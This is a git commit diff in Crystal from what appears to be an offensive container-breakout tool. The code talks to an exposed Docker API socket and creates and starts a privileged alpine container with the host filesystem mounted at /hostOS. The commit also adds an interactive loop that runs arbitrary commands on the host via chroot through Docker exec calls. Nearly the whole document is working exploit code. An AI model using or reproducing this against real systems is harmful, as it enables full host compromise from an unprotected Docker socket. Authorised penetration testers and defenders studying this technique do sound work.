61184130864ecf82b9d8e1c50f0191582c3b1df0
PercussiveElbow <PercussiveElbow@users.noreply.github.com>
2019-04-19 16:00:12 +0100

    Better handling of network escape

--- src/breakouts/network_socket_breakout.cr
+++ src/breakouts/network_socket_breakout.cr
@@ -7,19 +7,27 @@ def network_socket_breakout(ip)
     puts("Created container: #{id}")
     start_breakout_container(ip,id)
     puts("Started container: #{id}")
+    puts("We've started a privileged container with the host OS filesystem mounted. ")
+    handle_input(ip,id)
     exit()
 end
 
+def handle_input(ip,id)
+    while(true)
+        puts("Enter command to run or nothing to exit")
+        command = gets
+        if command && command.size() > 0
+            run_exec(ip,create_exec(ip,id,command))
+        else
+            exit()
+        end
+    end
+end
 
 def create_breakout_container(ip)
-    url = "#{ip}containers/create"
     begin 
-        host_config = {
-            "Binds": ["/:/hostOS"],
-        }
-        post_data = {"Image": "alpine", "Cmd": "/bin/sh", "privileged": true, "AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Tty": true,"HostConfig": host_config}
-        post_data = post_data.to_json
-        resp = HTTP::Client.post(url,  headers: HTTP::Headers{"Content-Type"=> "application/json"}, body: post_data)
+        post_data = {"Image": "alpine", "Cmd": "/bin/sh", "privileged": true, "AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Tty": true,"HostConfig": {"Binds": ["/:/hostOS"],}}.to_json
+        resp = HTTP::Client.post("#{ip}containers/create",  headers: HTTP::Headers{"Content-Type"=> "application/json"}, body: post_data)
         if resp != nil && resp.status_code == 201 && !resp.body.empty?
             return JSON.parse(resp.body)["Id"]
         else
@@ -30,17 +38,38 @@ def create_breakout_container(ip)
     end
 end
 
-
 def start_breakout_container(ip,id)
-    url = "#{ip}containers/#{id}/start"
     begin 
-        resp = HTTP::Client.post(url, headers: HTTP::Headers{"Content-Type"=> "application/json"})
-        if resp != nil && resp.status_code == 204
+        resp = HTTP::Client.post("#{ip}containers/#{id}/start", headers: HTTP::Headers{"Content-Type"=> "application/json"})   
+        raise("Non 200 response from docker socket\n#{resp.body}") if resp == nil && resp.status_code != 204 
+    rescue e
+        puts("Error occured attempting escape on #{ip}\n#{e}")
+    end
+end
+
+def create_exec(ip,id,command)
+    begin 
+        exec_data = {"AttachStdout": true, "Tty": true, "Cmd": [ "sh", "-c", "chroot /hostOS /bin/sh -c \"#{command}\""]}.to_json
+        resp = HTTP::Client.post("#{ip}containers/#{id}/exec", headers: HTTP::Headers{"Content-Type"=> "application/json"}, body: exec_data)
+        if resp != nil && resp.status_code == 201
+            return JSON.parse(resp.body)["Id"]
+        else
+            raise("Non 200 response from docker socket\n#{resp.body}")
+        end
+    rescue e
+        puts("Error occured attempting escape on #{ip}\n#{e}")
+    end
+end
+
+def run_exec(ip,exec_id)
+    begin
+        resp = HTTP::Client.post("#{ip}exec/#{exec_id}/start", headers: HTTP::Headers{"Content-Type"=> "application/json"}, body: {"Detach": false, "Tty": true}.to_json)
+        if resp != nil && resp.status_code == 200
             puts(resp.body)
         else
             raise("Non 200 response from docker socket\n#{resp.body}")
         end
     rescue e
-      puts("Error occured attempting escape on #{ip}\n#{e}")
+        puts("Error occured attempting escape on #{ip}\n#{e}")
     end
 end
